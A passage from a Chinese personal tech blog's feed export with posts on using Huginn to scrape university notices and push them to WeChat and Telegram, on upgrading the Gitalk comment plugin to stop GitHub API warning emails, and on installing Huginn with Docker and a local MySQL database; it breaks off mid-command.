rel="noopener">https://liquid.bootcss.com/</a>。</p><p>Liquid也是可以嵌套的，利用管道 <code>|</code> 可以将处理后的结果送到下一个filter。</p><p>除了Liquid自带的filter，Huginn还提供了一些自己的用法，详见官方文档 <a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a>。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/liquid_huginn.png" alt="Liquid Templating"></p><p>在这里，由于得到的 href 是相对地址（如 <code>/2020/0208/c11066a193409/page.htm</code>），为了得到绝对地址，在<code>template</code>中利用 <code> {{ url | to_uri: _response_.url }}</code> 进行处理。</p><p><em>（别说了，这几天找遍了XPath function和Liquid用法）</em></p><hr><p>设好之后可以点击<strong>Dry Run</strong>来试试，看看运行的结果，再做进一步的修改。</p><p>于是最终得到的<code>Crawler_AAO #1 Get Notice URLs</code> Options 如下。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://aao.nuaa.edu.cn/"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"on_change"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"time"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-data"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(.)"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url | to_uri<span class="token operator">:</span> _response_.url <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h3 id="创建获取内容的-Agent"><a href="#创建获取内容的-Agent" class="headerlink" title="创建获取内容的 Agent"></a>创建获取内容的 Agent</h3><p><strong>Crawler_AAO #2 Get Notice Contents</strong></p><p>一样是Website Agent。</p><p><code>Sources</code>选择第一步创建的Agent，即 <strong>Crawler_AAO #1 Get Notice URLs</strong>。</p><p><code>Options</code>中的<code>url</code>就来自第一个Agent，于是可以用Liquid中的<code> {{url}} </code>。</p><p><code>mode</code> 为 <code>merge</code>，合并之前的信息作为最终的输出。当然也可以利用模板<code>template</code>以及Liquid来调用之前获取的对象。</p><p>这里再利用Liquid中的<code>strip_html</code>用法，将所有的html标签去除，最终得到的<code>content</code>就只剩包含<code>\n</code>的字符串了。（之前试了XPath Function里的<code>normalize-space</code>函数，发现所有文字都连一起了，<del>丑死了emmm</del></p><p>最终得到如下的Options。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"{{url}}"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".wp_articlecontent"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"."</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> content | strip_html <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到微信"><a href="#将通知推送到微信" class="headerlink" title="将通知推送到微信"></a>将通知推送到微信</h2><p><strong>Crawler_AAO #3 WeChat Push</strong></p><p>这里利用Server Chan提供的微信模板消息推送服务，之前也写过一篇：<a href="https://miaotony.xyz/2019/03/07/Idea_PushBearAPI_WeChatPush/">小想法 | 基于PushBear API实现微信消息推送</a>。这次再来用一下呢。</p><p>现在 PushBear 一对多的推送需要绑定认证过的服务号了，但是个人的推送还是可以用的。</p><p>这次用的就是Huginn里的<strong>Post Agent</strong>啦。</p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>这个Agent的<code>method</code>可以是<code>get</code>, <code>post</code>, <code>put</code>, <code>patch</code>, and <code>delete</code>，基本的都能实现。</p><p>Server Chan那边说是用GET，但好像POST也行。</p><h3 id="post-url"><a href="#post-url" class="headerlink" title="post_url"></a>post_url</h3><p>填写Server Chan的API地址，<code> https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? </code></p><p>这里把API保存到了Credentials里，直接用Liquid模板调用就好了。</p><h3 id="content-type"><a href="#content-type" class="headerlink" title="content_type"></a>content_type</h3><p>这里用form（<code>application/x-www-form-urlencoded</code>）。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>API接口有两个参数，标题<code>text</code>（必须），描述<code>desp</code>（可选），支持Markdown语法。</p><p>这里自己定义就好了啦~ 怎么开心怎么来嘻嘻嘻。</p><pre class=" language-json"><code class="language-json"><span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"【{{title}}】"</span><span class="token punctuation">,</span>    <span class="token property">"desp"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> content | replace<span class="token operator">:</span> \<span class="token string">"\n\", \"\n\n\" }}"</span><span class="token punctuation">}</span></code></pre><p><strong>要注意的是：</strong>如果直接在它的模板里修改参数信息，则<strong>带有<code>\</code>的会自动转义为<code>\\</code></strong>！</p><p>因此直接写<code>\n</code>不可行，而要点击<strong>Toggle View</strong>然后直接写<code>\n</code>。或者也可以调用 Huginn 提供的方法 <code> {% line_break %} </code> 。</p><p>另一个问题，<strong>在Server Chan中<code>\n\n</code>才能换行</strong>，于是利用 Liquid 的<code> {{ content | replace: \"\n\", \"\n\n\" }} </code> 把<code>\n</code>给替换成<code>\n\n</code>。（需要直接写，不能直接在参数的框里改。</p><p>还要注意保存后如果再次修改则<code>\n</code>又会自动变为<code>\\n</code>，注意留意。建议保存之前先<strong>Dry Run</strong>试试。</p><h3 id="emit-events"><a href="#emit-events" class="headerlink" title="emit_events"></a>emit_events</h3><p>如果设为<code>true</code>，则会返回一个Event，可以再加一个Agent来判断是否发送成功。</p><p>例如某次发送成功后得到的Event如下，其中的body部分为返回的数据。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token property">"{\"errno\":0,\"errmsg\":\"success\",\"dataset\"</span><span class="token operator">:</span>\<span class="token string">"done\"}"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"Server"</span><span class="token operator">:</span> <span class="token string">"nginx"</span><span class="token punctuation">,</span>    <span class="token property">"Date"</span><span class="token operator">:</span> <span class="token string">"Tue, 10 Feb 2020 09:00:51 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span>    <span class="token property">"Connection"</span><span class="token operator">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token property">"Expires"</span><span class="token operator">:</span> <span class="token string">"Thu, 01 Jan 1970 00:00:01 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Cache-Control"</span><span class="token operator">:</span> <span class="token string">"no-cache, must-revalidate"</span><span class="token punctuation">,</span>    <span class="token property">"Pragma"</span><span class="token operator">:</span> <span class="token string">"no-cache"</span><span class="token punctuation">,</span>    <span class="token property">"Via"</span><span class="token operator">:</span> <span class="token string">"100167"</span><span class="token punctuation">,</span>    <span class="token property">"Set-Cookie"</span><span class="token operator">:</span> <span class="token string">"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Length"</span><span class="token operator">:</span> <span class="token number">47</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到Telegram-Channel"><a href="#将通知推送到Telegram-Channel" class="headerlink" title="将通知推送到Telegram Channel"></a>将通知推送到Telegram Channel</h2><p><strong>Crawler_AAO #3 Telegram Channel Push</strong></p><p>同样使用的是<strong>Post Agent</strong>。<em>（看了一下，Telegram Agent好像不大灵活，而且还需要先有一个Event Formatting Agent，让Event中包含either a <code>text</code>, <code>photo</code>, <code>audio</code>, <code>document</code> or <code>video</code> key.）</em></p><p>昨天研究了好久Telegram Bot，看了看<a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">官方API文档</a>，发现没有想象中的那么困难233333。</p><p>首先 @BotFather 注册一个TGBot，得到token。</p><p>这里没有设置Webhook，只需要用到<code>sendMessage</code>方法就好了。</p><h3 id="post-url-1"><a href="#post-url-1" class="headerlink" title="post_url"></a>post_url</h3><p>URL为<code>https://api.telegram.org/bot&lt;token&gt;/sendMessage</code>，将<code>&lt;token&gt;</code>部分换成自己的Bot token，可以保存到Credentials里。</p><p>如<code>https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage</code></p><p>可以先用 PostMan 测试一下。</p><p>别忘了<code>bot</code>……<em>（是我了</em></p><h3 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h3><p>POST or GET</p><h3 id="content-type-1"><a href="#content-type-1" class="headerlink" title="content_type"></a>content_type</h3><ul><li><a href="https://en.wikipedia.org/wiki/Query_string" target="_blank" rel="noopener">URL query string</a></li><li>application/x-www-form-urlencoded</li><li>application/json (except for uploading files)</li><li>multipart/form-data (use to upload files)</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>参数列表如下</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TGAPI.png" alt="API参数"></p><p>也可以使用Markdown语法。（还别说，真挺好</p><hr><p>其实还有一个问题，我部署Huginn的服务器是在墙内的，于是还需要想办法转发出去。</p><p>具体自己想办法了啦。</p><p><del>（折腾了半天用 <em>heroku</em> 搭了一个自己凑合着用</del></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实最初是想看看Huginn怎么用的，折腾过程中还去看了Liquid模板语法，XPath Functions用法。</p><p>推送到微信的前几天就弄好了，昨天想看看TG Bot怎么玩，于是研究了一下Bot API，顺便又写了个推送到TG Channel的。</p><p><strong>最终的效果——</strong></p><p>每隔一段时间，Huginn 就会派出一个Agent小兵，去看一看教务有没有新的通知公告。</p><p>噢来了呀！Agent带回来了一个新的Event，快把它推给主人吧！</p><p>Ding~</p><p>微信来了一条新信息。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p>TG的Channel那边也来了。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><p>嗯，这个感觉就很棒，朴实无华，且枯燥。（然而并没有钱</p><p>emmm 24号开始就要网上上课了。</p><hr><p><strong>以上内容仅供学习研究，请勿用于非法用途。</strong></p><p>噢对了，TG Channel的邀请链接在这个域名里找嘻嘻嘻——</p><p><strong><em>_tg_aaonotice.miaotony.xyz</em></strong></p><br><hr><p>就在我部署这篇文章的时候，发现所有的 非代码块内的 Liquid语言全部被hexo认为是代码了emmm</p><p>我忘记hexo也用了Liquid了。。（感觉蠢死了</p><p>于是把需要在所有的 <code>{{xxx}}</code>和<code>{% xxx %}</code>外面套一层 <code>{% raw %} ...  {% endraw %}</code><br>如果要写上面这个<code>raw</code>，需要写两个（类似于转义）。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw.png" alt="raw"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw2.png" alt="raw2"></p><hr><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><p><a href="https://github.com/huginn/huginn/wiki" target="_blank" rel="noopener">Huginn Wiki</a></p></li><li><p><a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a></p></li><li><p><a href="https://liquid.bootcss.com/" target="_blank" rel="noopener">Liquid 中文文档</a></p></li><li><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">Huginn Agent 文档</a></p></li><li><p><a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">Telegram Bot官方API文档</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/46216545" target="_blank" rel="noopener">RSS 进阶篇：Huginn - 真·为任意网页定制 RSS 源（PhantomJs 抓取）</a></p></li><li><p><a href="https://blog.wangjiegulu.com/2018/11/16/douban_high_movie_huginn_telegram/" target="_blank" rel="noopener">Huginn 实现自动通过 Telegram 推送豆瓣高分电影</a></p></li><li><p><a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>etc.</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Projects </tag>
            
            <tag> Huginn </tag>
            
            <tag> Telegram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog折腾记 | 升级Gitalk评论插件以解决EmailBombs</title>
      <link href="/2020/02/07/Blog_UpdateGitalk/"/>
      <url>/2020/02/07/Blog_UpdateGitalk/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这几天我的邮箱被 GitHub 轰炸了emmm。</p><p>具体大概是这样的——</p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail.png" alt="GitHubEmail"></p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail2.png" alt="GitHubEmail2"></p><p>说好的</p><blockquote><p>Depending on your API usage, we’ll be sending you this email reminder at most once every 3 days.</p></blockquote><p>然而从2月4日开始每天都有一堆……</p><p><strong>所以这到底是什么回事呢？</strong></p><p>我一想，用到这个 API 的只有我博客的 Gitalk 评论插件。目前我博客的评论都放在了GitHub项目的issue里，每篇文章浏览到下面的时候会自动加载评论，这时候就会向GitHub的API发请求从而获取相应数据。</p><br><hr><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>于是去 gitalk 的官方仓库看了看，果然2月4日当天就有人提issue了，看来不少人 Email Bombs 了23333（摊手。</p><p><a href="https://github.com/gitalk/gitalk/issues/343" target="_blank" rel="noopener">https://github.com/gitalk/gitalk/issues/343</a></p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue.png" alt="issue"></p><p>很多大佬对这个问题进行了讨论，当然也有不少 <code>+1 Mark</code>之类的在旁观。</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>2月4日这样，@geektutu 给出了一个 <strong>Use read-only personal access token to replace clientID &amp; clientSecret</strong> 的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/344" target="_blank" rel="noopener">#344</a>。这个PR在2月6日merge了。</p><p>根据他的建议，首先需要更新 <code>gitalk.min.js</code>文件，如果想获得更多的API使用量，需要在 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">accessToken</a> 里生成一个只读的token，而后修改 Gitalk 模板里的配置，新增<code>accessToken</code>项。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> gitalk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gitalk</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  clientID<span class="token punctuation">:</span> <span class="token string">'GitHub Application Client ID'</span><span class="token punctuation">,</span>  clientSecret<span class="token punctuation">:</span> <span class="token string">'GitHub Application Client Secret'</span><span class="token punctuation">,</span>  accessToken<span class="token punctuation">:</span> <span class="token string">'Github Personal Access Token'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// IMPORTANT !!!</span>  repo<span class="token punctuation">:</span> <span class="token string">'GitHub repo'</span><span class="token punctuation">,</span>  owner<span class="token punctuation">:</span> <span class="token string">'GitHub repo owner'</span><span class="token punctuation">,</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>根据 <a href="https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/#available-scopes" target="_blank" rel="noopener">Understanding scopes for OAuth Apps</a> ，在<strong>新建 access token 时不选择任何选项</strong>，则生成的token只有<strong>公开信息的只读</strong>权限（<em>Grants read-only access to public information (includes public user profile info, public repository info, and gists)</em>）。</p><p>6号我也更新了这一版本，做了相应的修改，的确邮箱不被轰炸了。😂</p><p>但是，<strong>这个 access token 在任何人访问博客的时候都是公开可见的</strong>，不免存在风险，这也在issue里有过讨论。@geektutu 也说这是个临时方案。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue2.png" alt="issue2"></p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>2月7日，这个issue的发起者 @fletchto99 给出了他的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/346" target="_blank" rel="noopener">gitalk/gitalk#346</a> </p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue3.png" alt="issue3"></p><p>利用原来的<code>client_id</code> 和 <code>client_secret</code> 作为 basic auth 是可行的。</p><p>按照他的方案，<strong>不需要修改其他的任何配置，直接把Gitalk的js升级到V1.5.2</strong> 即可。</p><p>这样就方便了很多哈，试了一下果然是可行的。</p><p>而且这个可以说是<strong>最佳方案</strong>了呢！</p><h2 id="针对-Matery-主题的修改"><a href="#针对-Matery-主题的修改" class="headerlink" title="针对 Matery 主题的修改"></a>针对 Matery 主题的修改</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>对于我现在使用的 <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">Matery</a> 主题（<em>hexo-theme-matery</em>），只需要将 <code>\hexo\themes\matery\source\libs\gitalk</code>目录下的 <code>gitalk.min.js</code>和 <code>gitalk.css</code> 更新到最新版本（&gt;= V1.5.2）即可。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>当然也可以修改配置文件里引用的 JavaScript（、CSS）地址为链接版本。</p><p>目前 CDN 上的 Gitalk 已经更新到了最新版本。</p><p>打开<code>\hexo\themes\matery\_config.yml</code>，修改其中的 <code>libs</code>。</p><pre class=" language-yml"><code class="language-yml">libs:  css:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css    # 或者 https://unpkg.com/gitalk/dist/gitalk.css    # ...  js:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js    # 或者 https://unpkg.com/gitalk/dist/gitalk.min.js     # ...</code></pre><p>保存后，在 hexo 的目录下执行 <code>hexo clean &amp;&amp; hexo g</code>，再部署即可。</p><hr><p>最后，顺手给 <em><a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a></em> 提了个PR，更新了这一依赖，详见  <a href="https://github.com/blinkfox/hexo-theme-matery/pull/318" target="_blank" rel="noopener">blinkfox/hexo-theme-matery#318</a> 。</p><p><img src="/2020/02/07/Blog_UpdateGitalk/PR.png" alt="PR"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> blog </tag>
            
            <tag> Gitalk </tag>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Docker搭建Huginn</title>
      <link href="/2020/02/03/Server_Huginn/"/>
      <url>/2020/02/03/Server_Huginn/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/03/Server_Huginn/Huginn.png" alt="Huginn"></p><h2 id="What-is-Huginn"><a href="#What-is-Huginn" class="headerlink" title="What is Huginn?"></a>What is Huginn?</h2><blockquote><p>Huginn is a system for building agents that perform automated tasks for  you online.  They can read the web, watch for events, and take actions  on your behalf.  Huginn’s Agents create and consume events, propagating  them along a directed graph.  Think of it as a hackable version of IFTTT or Zapier on your own server.  You always know who has your data.  You  do.</p></blockquote><blockquote><p>Huginn是一个神器，它是一个私人IFTTT，例如搭建任务采集触发平台，自动跟进实时提醒（用Email Slack Telegeram QQ  微信接收推送），全文 RSS 输出（把你关注的所有网页进行 RSS  全文输出），同时可以把各种app，软件，网络服务，网络设备等链接在一起做任务触发。 </p></blockquote><p>官方Github仓库：<a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p>这个是我在玩爬虫的时候，偶然间在网上看到的一个工具，能做的事情还不少，觉得还挺不错的，这次就试着搭建一下吧。  </p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>手动安装的话，需要下面这样一步步来，感觉好麻烦……（懒</p><blockquote><p>The Huginn installation consists of setting up the following components:   </p><ol><li>Packages / Dependencies</li><li>Ruby</li><li>System Users</li><li>Database</li><li>Huginn</li><li>Nginx</li></ol></blockquote><p>但是，Huginn还提供了一种通过docker来搭建的方式，可以免去配环境的烦恼，感觉贼好~</p><p>官方的文档在<a href="https://github.com/huginn/huginn/blob/master/doc/docker/install.md" target="_blank" rel="noopener">这里</a>。</p><h3 id="1-安装-Docker"><a href="#1-安装-Docker" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>可以参考<a href="https://miaotony.xyz/2020/02/02/Server_Docker/">这里</a>。</p><h3 id="2-安装-Huginn"><a href="#2-安装-Huginn" class="headerlink" title="2. 安装 Huginn"></a>2. 安装 Huginn</h3><p>最简单的就直接</p><pre class=" language-bash"><code class="language-bash">docker run -it -p 3000:3000 huginn/huginn</code></pre><p>首先会把<code>huginn</code>给pull下来，然后运行。</p><p>然后访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a> 可以看到</p><p><img src="/2020/02/03/Server_Huginn/Huginn2.png" alt="登录界面"></p><h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3. 登录"></a>3. 登录</h3><p>利用username <code>admin</code> and password <code>password</code>登录，之后可以在<code>Account</code>里进行修改。</p><p><img src="/2020/02/03/Server_Huginn/Huginn3.png" alt="登录后首页"></p><h3 id="4-配置开机自启"><a href="#4-配置开机自启" class="headerlink" title="4. 配置开机自启"></a>4. 配置开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，接下来就可以<strong>尽情感受<code>huginn</code>的魅力</strong>了！</p><br><hr><br><h2 id="Connect-to-local-MySQL"><a href="#Connect-to-local-MySQL" class="headerlink" title="Connect to local MySQL"></a>Connect to local MySQL</h2><p>上面的安装方法是最简单的，默认会在Docker容器里安装MySQL数据库等环境。</p><p>但是如果本机就装了一个MySQL数据库，需要 huginn 共享的话，</p><p>或者说<strong>想要<code>huginn</code>连接到本地数据库</strong>，可以像下面这样安装。</p><h3 id="1-安装-Docker-1"><a href="#1-安装-Docker-1" class="headerlink" title="1. 安装 Docker"></a>1. 安装 Docker</h3><p>同上。</p><h3 id="2-配置-MySQL"><a href="#2-配置-MySQL" class="headerlink" title="2. 配置 MySQL"></a>2. 配置 MySQL</h3><h4 id="2-1-修改绑定的IP为-0-0-0-0"><a href="#2-1-修改绑定的IP为-0-0-0-0" class="headerlink" title="2.1 修改绑定的IP为 0.0.0.0"></a>2.1 修改绑定的IP为 <code>0.0.0.0</code></h4><p>这是为了让docker能连接到本地的数据库。</p><p>默认的 <code>127.0.0.1</code> 只能从本地访问。</p><p><strong>MySQL：</strong></p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p>修改</p><pre><code>bind-address = 0.0.0.0</code></pre><p>然后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql </code></pre><p><strong>MariaDB：</strong></p><p><code>/etc/mysql/mariadb.cnf</code>包含了下面的所以<code>.cnf</code>文件</p><pre><code>!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/</code></pre><p>我这里的在下面这个文件里</p><pre class=" language-bash"><code class="language-bash">vim /etc/mysql/mariadb.conf.d/50-server.cnf</code></pre><p>同样修改 <code>bind-address = 0.0.0.0</code></p><p>而后 重启</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql</code></pre><h4 id="2-2-MySQL里新建-huginn-用户"><a href="#2-2-MySQL里新建-huginn-用户" class="headerlink" title="2.2 MySQL里新建 huginn 用户"></a>2.2 MySQL里新建 <code>huginn</code> 用户</h4><p><strong>当然也可以让<code>huginn</code>直接以<code>root</code>用户来访问数据库，那就直接跳到2.3节。</strong></p><p>不过安全起见，还是新建一个用户吧。</p><p>以<code>root</code>登录MySQL / MariaDB</p><pre class=" language-bash"><code class="language-bash">mysql -u root -p</code></pre><p>新建<code>huginn</code>用户，密码为<code>PASSWORD</code></p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'%' identified by 'PASSWORD';</code></pre><p>这个是允许从任意地方登录。</p><p>如果要限制从<code>docker</code>里启动，先<code>ifconfig</code>看下 <code>docker0</code> 的IP，一般是<code>172.17.0.1</code>，则 docker IP 为<code>172.17.0.*</code>，于是</p><pre class=" language-mysql"><code class="language-mysql">create user 'huginn'@'172.17.0.%' identified by 'PASSWORD';</code></pre><h4 id="2-3-赋予权限"><a href="#2-3-赋予权限" class="headerlink" title="2.3 赋予权限"></a>2.3 赋予权限</h4><pre class=" language-mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION;flush privileges;</code></pre><p>如果限制访问的数据库则修改<code>*.*</code>为相应的数据库即可。</p><h3 id="3-配置-firewall"><a href="#3-配置-firewall" class="headerlink" title="3. 配置 firewall"></a>3. 配置 firewall</h3><p>如果启用了 firewall 的话，需要放行本地的3306端口（即数据库的相应端口）。</p><p>Ubuntu：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 